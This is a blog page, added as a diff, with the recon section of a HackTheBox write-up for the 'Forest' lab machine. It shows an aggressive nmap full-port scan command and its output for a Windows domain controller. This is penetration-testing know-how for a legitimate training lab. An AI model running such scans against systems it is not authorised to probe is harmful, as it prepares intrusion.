@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Forest | Recon The below is an nmap scan report obtained via autorecon (https://github.com/Tib3rius/AutoRecon). I am usually for manual steps because...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Forest</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-09-26 07:10:00+01:00">Sat 26 September 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Forest.html">Forest</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Forest.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="recon">Recon</h1>
+<p>The below is an <code>nmap</code> scan report obtained via <code>autorecon</code> (https://github.com/Tib3rius/AutoRecon). I am usually for manual steps because they allow me to learn and memorize stuff but <code>autorecon</code> is among the automated tools I love using because it retrieves lot of information for you that otherwise you may miss. It's easy to get stuck with rabbit holes when you find a single hint but <code>autorecon</code> gets you the full picture so that you can look at things holistically avoiding getting stuck. The tool, after all, is a python script which in turn launches other tools such as <code>nmap</code>, <code>enum4linux</code>, etc.</p>
+<div class="highlight"><pre><span></span><span class="err">#</span> <span class="nt">Nmap</span> <span class="nt">7</span><span class="p">.</span><span class="nc">80</span> <span class="nt">scan</span> <span class="nt">initiated</span> <span class="nt">Sat</span> <span class="nt">Sep</span> <span class="nt">26</span> <span class="nt">06</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">01</span> <span class="nt">2020</span> <span class="nt">as</span><span class="o">:</span> <span class="nt">nmap</span> <span class="nt">-vv</span> <span class="nt">--reason</span> <span class="nt">-Pn</span> <span class="nt">-A</span> <span class="nt">--osscan-guess</span> <span class="nt">--version-all</span> <span class="nt">-p-</span> <span class="nt">-oN</span> <span class="o">/</span><span class="nt">home</span><span class="o">/</span><span class="nt">kali</span><span class="o">/</span><span class="nt">Documents</span><span class="o">/</span><span class="nt">HTB</span><span class="o">/</span><span class="nt">boxes</span><span class="o">/</span><span class="nt">results</span><span class="o">/</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span><span class="o">/</span><span class="nt">scans</span><span class="o">/</span><span class="nt">_full_tcp_nmap</span><span class="p">.</span><span class="nc">txt</span> <span class="nt">-</span><span class="cp">[</span><span class="mi">36</span><span class="p">/</span><span class="nx">9248</span><span class="cp">]</span>
+<span class="nt">kali</span><span class="o">/</span><span class="nt">Documents</span><span class="o">/</span><span class="nt">HTB</span><span class="o">/</span><span class="nt">boxes</span><span class="o">/</span><span class="nt">results</span><span class="o">/</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span><span class="o">/</span><span class="nt">scans</span><span class="o">/</span><span class="nt">xml</span><span class="o">/</span><span class="nt">_full_tcp_nmap</span><span class="p">.</span><span class="nc">xml</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span>               
+<span class="nt">Increasing</span> <span class="nt">send</span> <span class="nt">delay</span> <span class="nt">for</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span> <span class="nt">from</span> <span class="nt">0</span> <span class="nt">to</span> <span class="nt">5</span> <span class="nt">due</span> <span class="nt">to</span> <span class="nt">15</span> <span class="nt">out</span> <span class="nt">of</span> <span class="nt">48</span> <span class="nt">dropped</span> <span class="nt">probes</span> <span class="nt">since</span> <span class="nt">last</span> <span class="nt">increase</span><span class="o">.</span>                                                                                                   
+<span class="nt">Increasing</span> <span class="nt">send</span> <span class="nt">delay</span> <span class="nt">for</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span> <span class="nt">from</span> <span class="nt">5</span> <span class="nt">to</span> <span class="nt">10</span> <span class="nt">due</span> <span class="nt">to</span> <span class="nt">16</span> <span class="nt">out</span> <span class="nt">of</span> <span class="nt">51</span> <span class="nt">dropped</span> <span class="nt">probes</span> <span class="nt">since</span> <span class="nt">last</span> <span class="nt">increase</span><span class="o">.</span>                                                                                                  
+<span class="nt">Increasing</span> <span class="nt">send</span> <span class="nt">delay</span> <span class="nt">for</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span> <span class="nt">from</span> <span class="nt">20</span> <span class="nt">to</span> <span class="nt">40</span> <span class="nt">due</span> <span class="nt">to</span> <span class="nt">19</span> <span class="nt">out</span> <span class="nt">of</span> <span class="nt">62</span> <span class="nt">dropped</span> <span class="nt">probes</span> <span class="nt">since</span> <span class="nt">last</span> <span class="nt">increase</span><span class="o">.</span>                                                                                                 
+<span class="nt">Increasing</span> <span class="nt">send</span> <span class="nt">delay</span> <span class="nt">for</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span> <span class="nt">from</span> <span class="nt">40</span> <span class="nt">to</span> <span class="nt">80</span> <span class="nt">due</span> <span class="nt">to</span> <span class="nt">39</span> <span class="nt">out</span> <span class="nt">of</span> <span class="nt">129</span> <span class="nt">dropped</span> <span class="nt">probes</span> <span class="nt">since</span> <span class="nt">last</span> <span class="nt">increase</span><span class="o">.</span>                                                                                                
+<span class="nt">Nmap</span> <span class="nt">scan</span> <span class="nt">report</span> <span class="nt">for</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">161</span>                                                                     
+<span class="nt">Host</span> <span class="nt">is</span> <span class="nt">up</span><span class="o">,</span> <span class="nt">received</span> <span class="nt">user-set</span> <span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">089s</span> <span class="nt">latency</span><span class="o">).</span>                                                       
+<span class="nt">Scanned</span> <span class="nt">at</span> <span class="nt">2020-09-26</span> <span class="nt">06</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">02</span> <span class="nt">BST</span> <span class="nt">for</span> <span class="nt">17582s</span>                                                         
+<span class="nt">Not</span> <span class="nt">shown</span><span class="o">:</span> <span class="nt">65500</span> <span class="nt">closed</span> <span class="nt">ports</span>                                                                         
+<span class="nt">Reason</span><span class="o">:</span> <span class="nt">65500</span> <span class="nt">conn-refused</span>                                                                            
+<span class="nt">PORT</span>      <span class="nt">STATE</span>    <span class="nt">SERVICE</span>      <span class="nt">REASON</span>      <span class="nt">VERSION</span>                                                   
+<span class="nt">53</span><span class="o">/</span><span class="nt">tcp</span>    <span class="nt">open</span>     <span class="nt">domain</span><span class="o">?</span>      <span class="nt">syn-ack</span>                                                               
+<span class="o">|</span> <span class="nt">fingerprint-strings</span><span class="o">:</span>                                                                                
+<span class="o">|</span>   <span class="nt">DNSVersionBindReqTCP</span><span class="o">:</span>                                                                             
+<span class="o">|</span>     <span class="nt">version</span>                                                                                         
+<span class="o">|</span><span class="nt">_</span>    <span class="nt">bind</span>                                                                                            
+<span class="nt">88</span><span class="o">/</span><span class="nt">tcp</span>    <span class="nt">open</span>     <span class="nt">kerberos-sec</span> <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">Kerberos</span> <span class="o">(</span><span class="nt">server</span> <span class="nt">time</span><span class="o">:</span> <span class="nt">2020-09-26</span> <span class="nt">10</span><span class="p">:</span><span class="nd">10</span><span class="p">:</span><span class="nd">00Z</span><span class="o">)</span>                                                                                                   
+<span class="nt">135</span><span class="o">/</span><span class="nt">tcp</span>   <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>                                     
+<span class="nt">139</span><span class="o">/</span><span class="nt">tcp</span>   <span class="nt">open</span>     <span class="nt">netbios-ssn</span>  <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">netbios-ssn</span>                             
+<span class="nt">389</span><span class="o">/</span><span class="nt">tcp</span>   <span class="nt">open</span>     <span class="nt">ldap</span>         <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">Active</span> <span class="nt">Directory</span> <span class="nt">LDAP</span> <span class="o">(</span><span class="nt">Domain</span><span class="o">:</span> <span class="nt">htb</span><span class="p">.</span><span class="nc">local</span><span class="o">,</span> <span class="nt">Site</span><span class="o">:</span> <span class="nt">Default-First-Site-Name</span><span class="o">)</span>                                                                       
+<span class="nt">445</span><span class="o">/</span><span class="nt">tcp</span>   <span class="nt">open</span>     <span class="nt">microsoft-ds</span> <span class="nt">syn-ack</span>     <span class="nt">Windows</span> <span class="nt">Server</span> <span class="nt">2016</span> <span class="nt">Standard</span> <span class="nt">14393</span> <span class="nt">microsoft-ds</span> <span class="o">(</span><span class="nt">workgroup</span><span class="o">:</span> <span class="nt">HTB</span><span class="o">)</span>                                                                                                 
+<span class="nt">464</span><span class="o">/</span><span class="nt">tcp</span>   <span class="nt">open</span>     <span class="nt">kpasswd5</span><span class="o">?</span>    <span class="nt">syn-ack</span>                                                               
+<span class="nt">593</span><span class="o">/</span><span class="nt">tcp</span>   <span class="nt">open</span>     <span class="nt">ncacn_http</span>   <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span> <span class="nt">over</span> <span class="nt">HTTP</span> <span class="nt">1</span><span class="p">.</span><span class="nc">0</span>                       
+<span class="nt">636</span><span class="o">/</span><span class="nt">tcp</span>   <span class="nt">open</span>     <span class="nt">tcpwrapped</span>   <span class="nt">syn-ack</span>                                                               
+<span class="nt">3268</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>     <span class="nt">ldap</span>         <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">Active</span> <span class="nt">Directory</span> <span class="nt">LDAP</span> <span class="o">(</span><span class="nt">Domain</span><span class="o">:</span> <span class="nt">htb</span><span class="p">.</span><span class="nc">local</span><span class="o">,</span> <span class="nt">Site</span><span class="o">:</span> <span class="nt">Default-First-Site-Name</span><span class="o">)</span>                                                                       
+<span class="nt">3269</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>     <span class="nt">tcpwrapped</span>   <span class="nt">syn-ack</span>                                                               
+<span class="nt">5831</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">5985</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>     <span class="nt">http</span>         <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">HTTPAPI</span> <span class="nt">httpd</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span> <span class="o">(</span><span class="nt">SSDP</span><span class="o">/</span><span class="nt">UPnP</span><span class="o">)</span>                   
+<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span> <span class="nt">Microsoft-HTTPAPI</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span>                                                           
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span> <span class="nt">Not</span> <span class="nt">Found</span>                                                                               
+<span class="nt">9389</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>     <span class="nt">mc-nmf</span>       <span class="nt">syn-ack</span>     <span class="p">.</span><span class="nc">NET</span> <span class="nt">Message</span> <span class="nt">Framing</span>                                      
+<span class="nt">10408</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">16999</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">19145</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">26874</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+
+<span class="nt">40188</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                                                                                                                          <span class="cp">[</span><span class="mi">0</span><span class="p">/</span><span class="nx">9248</span><span class="cp">]</span>
+<span class="nt">46294</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">46996</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">47001</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">http</span>         <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">HTTPAPI</span> <span class="nt">httpd</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span> <span class="o">(</span><span class="nt">SSDP</span><span class="o">/</span><span class="nt">UPnP</span><span class="o">)</span>
+<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span> <span class="nt">Microsoft-HTTPAPI</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span>                                                           
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span> <span class="nt">Not</span> <span class="nt">Found</span>                                                                               
+<span class="nt">49664</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>
+<span class="nt">49665</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>
+<span class="nt">49666</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>
+<span class="nt">49667</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>
+<span class="nt">49671</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>    
+<span class="nt">49676</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">ncacn_http</span>   <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span> <span class="nt">over</span> <span class="nt">HTTP</span> <span class="nt">1</span><span class="p">.</span><span class="nc">0</span>
+<span class="nt">49677</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span> 
+<span class="nt">49684</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>
+<span class="nt">49703</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>  
+<span class="nt">49927</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span>     <span class="nt">msrpc</span>        <span class="nt">syn-ack</span>     <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">RPC</span>      
+<span class="nt">56278</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">62108</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>                                                           
+<span class="nt">64026</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">filtered</span> <span class="nt">unknown</span>      <span class="nt">no-response</span>   
+<span class="nt">1</span> <span class="nt">service</span> <span class="nt">unrecognized</span> <span class="nt">despite</span> <span class="nt">returning</span> <span class="nt">data</span><span class="o">.</span> <span class="nt">If</span> <span class="nt">you</span> <span class="nt">know</span> <span class="nt">the</span> <span class="nt">service</span><span class="o">/</span><span class="nt">version</span><span class="o">,</span> <span class="nt">please</span> <span class="nt">submit</span> <span class="nt">the</span> <span class="nt">following</span> <span class="nt">fingerprint</span> <span class="nt">at</span> <span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">cgi-bin</span><span class="o">/</span><span class="nt">submit</span><span class="p">.</span><span class="nc">cgi</span><span class="o">?</span><span class="nt">new-service</span> <span class="o">:</span>                                 
+<span class="nt">SF-Port53-TCP</span><span class="p">:</span><span class="nd">V</span><span class="o">=</span><span class="nt">7</span><span class="p">.</span><span class="nc">80</span><span class="o">%</span><span class="nt">I</span><span class="o">=</span><span class="nt">9</span><span class="o">%</span><span class="nt">D</span><span class="o">=</span><span class="nt">9</span><span class="o">/</span><span class="nt">26</span><span class="o">%</span><span class="nt">Time</span><span class="o">=</span><span class="nt">5F6F10E4</span><span class="o">%</span><span class="nt">P</span><span class="o">=</span><span class="nt">x86_64-pc-linux-gnu</span><span class="o">%</span><span class="nt">r</span><span class="o">(</span><span class="nt">DNSV</span>                                                                                                                                   
+<span class="nt">SF</span><span class="p">:</span><span class="nd">ersionBindReqTCP</span><span class="o">,</span><span class="nt">20</span><span class="o">,</span><span class="s2">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\             </span>
+<span class="s2">SF:x04bind\0\0\x10\0\x03&quot;</span><span class="o">);</span>                                                                                                                                                                                  
+<span class="nt">Service</span> <span class="nt">Info</span><span class="o">:</span> <span class="nt">Host</span><span class="o">:</span> <span class="nt">FOREST</span><span class="o">;</span> <span class="nt">OS</span><span class="o">:</span> <span class="nt">Windows</span><span class="o">;</span> <span class="nt">CPE</span><span class="o">:</span> <span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">microsoft</span><span class="p">:</span><span class="nd">windows</span>                                                                                                                                       
+
+<span class="nt">Host</span> <span class="nt">script</span> <span class="nt">results</span><span class="o">:</span>                                                                                                                                                                                         
+<span class="o">|</span><span class="nt">_clock-skew</span><span class="o">:</span> <span class="nt">mean</span><span class="o">:</span> <span class="nt">2h31m05s</span><span class="o">,</span> <span class="nt">deviation</span><span class="o">:</span> <span class="nt">4h02m31s</span><span class="o">,</span> <span class="nt">median</span><span class="o">:</span> <span class="nt">11m03s</span>                                     
+<span class="o">|</span> <span class="nt">p2p-conficker</span><span class="o">:</span>                               
+<span class="o">|</span>   <span class="nt">Checking</span> <span class="nt">for</span> <span class="nt">Conficker</span><span class="p">.</span><span class="nc">C</span> <span class="nt">or</span> <span class="nt">higher</span><span class="o">...</span>    
+<span class="o">|</span>   <span class="nt">Check</span> <span class="nt">1</span> <span class="o">(</span><span class="nt">port</span> <span class="nt">39687</span><span class="o">/</span><span class="nt">tcp</span><span class="o">):</span> <span class="nt">CLEAN</span> <span class="o">(</span><span class="nt">Couldn</span><span class="s1">&#39;t connect)                                                </span>
+<span class="s1">|   Check 2 (port 32753/tcp): CLEAN (Couldn&#39;</span><span class="nt">t</span> <span class="nt">connect</span><span class="o">)</span>                                                
+<span class="o">|</span>   <span class="nt">Check</span> <span class="nt">3</span> <span class="o">(</span><span class="nt">port</span> <span class="nt">59790</span><span class="o">/</span><span class="nt">udp</span><span class="o">):</span> <span class="nt">CLEAN</span> <span class="o">(</span><span class="nt">Timeout</span><span class="o">)</span>                                                         
+<span class="o">|</span>   <span class="nt">Check</span> <span class="nt">4</span> <span class="o">(</span><span class="nt">port</span> <span class="nt">44587</span><span class="o">/</span><span class="nt">udp</span><span class="o">):</span> <span class="nt">CLEAN</span> <span class="o">(</span><span class="nt">Failed</span> <span class="nt">to</span> <span class="nt">receive</span> <span class="nt">data</span><span class="o">)</span>                                          
+<span class="o">|</span><span class="nt">_</span>  <span class="nt">0</span><span class="o">/</span><span class="nt">4</span> <span class="nt">checks</span> <span class="nt">are</span> <span class="nt">positive</span><span class="o">:</span> <span class="nt">Host</span> <span class="nt">is</span> <span class="nt">CLEAN</span> <span class="nt">or</span> <span class="nt">ports</span> <span class="nt">are</span> <span class="nt">blocked</span>                                       
+<span class="o">|</span> <span class="nt">smb-os-discovery</span><span class="o">:</span>       
+<span class="o">|</span>   <span class="nt">OS</span><span class="o">:</span> <span class="nt">Windows</span> <span class="nt">Server</span> <span class="nt">2016</span> <span class="nt">Standard</span> <span class="nt">14393</span> <span class="o">(</span><span class="nt">Windows</span> <span class="nt">Server</span> <span class="nt">2016</span> <span class="nt">Standard</span> <span class="nt">6</span><span class="p">.</span><span class="nc">3</span><span class="o">)</span>                         
+<span class="o">|</span>   <span class="nt">Computer</span> <span class="nt">name</span><span class="o">:</span> <span class="nt">FOREST</span>
+<span class="o">|</span>   <span class="nt">NetBIOS</span> <span class="nt">computer</span> <span class="nt">name</span><span class="o">:</span> <span class="nt">FOREST</span><span class="err">\</span><span class="nt">x00</span>                                                                                                                                                                        
+<span class="o">|</span>   <span class="nt">Domain</span> <span class="nt">name</span><span class="o">:</span> <span class="nt">htb</span><span class="p">.</span><span class="nc">local</span>                                                                            
+<span class="o">|</span>   <span class="nt">Forest</span> <span class="nt">name</span><span class="o">:</span> <span class="nt">htb</span><span class="p">.</span><span class="nc">local</span>                                                                            
+<span class="o">|</span>   <span class="nt">FQDN</span><span class="o">:</span> <span class="nt">FOREST</span><span class="p">.</span><span class="nc">htb</span><span class="p">.</span><span class="nc">local</span>                                                                                                                                                                                   
+<span class="o">|</span><span class="nt">_</span>  <span class="nt">System</span> <span class="nt">time</span><span class="o">:</span> <span class="nt">2020-09-26T03</span><span class="p">:</span><span class="nd">17</span><span class="p">:</span><span class="nd">57-07</span><span class="p">:</span><span class="nd">00</span>                                                                                                                                                                   
+<span class="o">|</span> <span class="nt">smb-security-mode</span><span class="o">:</span>                   
+<span class="o">|</span>   <span class="nt">account_used</span><span class="o">:</span> <span class="nt">guest</span>                                                                               
+<span class="o">|</span>   <span class="nt">authentication_level</span><span class="o">:</span> <span class="nt">user</span>         
+<span class="o">|</span>   <span class="nt">challenge_response</span><span class="o">:</span> <span class="nt">supported</span>                                                                                                                                                                            
+<span class="o">|</span><span class="nt">_</span>  <span class="nt">message_signing</span><span class="o">:</span> <span class="nt">required</span>          
+<span class="o">|</span> <span class="nt">smb2-security-mode</span><span class="o">:</span>                      
+<span class="o">|</span>   <span class="nt">2</span><span class="p">.</span><span class="nc">02</span><span class="o">:</span>                                                                                             
+<span class="o">|</span><span class="nt">_</span>    <span class="nt">Message</span> <span class="nt">signing</span> <span class="nt">enabled</span> <span class="nt">and</span> <span class="nt">required</span> 
+<span class="o">|</span> <span class="nt">smb2-time</span><span class="o">:</span>           
+<span class="o">|</span>   <span class="nt">date</span><span class="o">:</span> <span class="nt">2020-09-26T10</span><span class="p">:</span><span class="nd">17</span><span class="p">:</span><span class="nd">58</span>                                                                         
+<span class="o">|</span><span class="nt">_</span>  <span class="nt">start_date</span><span class="o">:</span> <span class="nt">2020-09-26T05</span><span class="p">:</span><span class="nd">15</span><span class="p">:</span><span class="nd">01</span>        
+
+<span class="nt">Read</span> <span class="nt">data</span> <span class="nt">files</span> <span class="nt">from</span><span class="o">:</span> <span class="o">/</span><span class="nt">usr</span><span class="o">/</span><span class="nt">bin</span><span class="o">/../</span><span class="nt">share</span><span class="o">/</span><span class="nt">nmap</span>
+<span class="nt">Service</span> <span class="nt">detection</span> <span class="nt">performed</span><span class="o">.</span> <span class="nt">Please</span> <span class="nt">report</span> <span class="nt">any</span> <span class="nt">incorrect</span> <span class="nt">results</span> <span class="nt">at</span> <span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">submit</span><span class="o">/</span> <span class="o">.</span>        
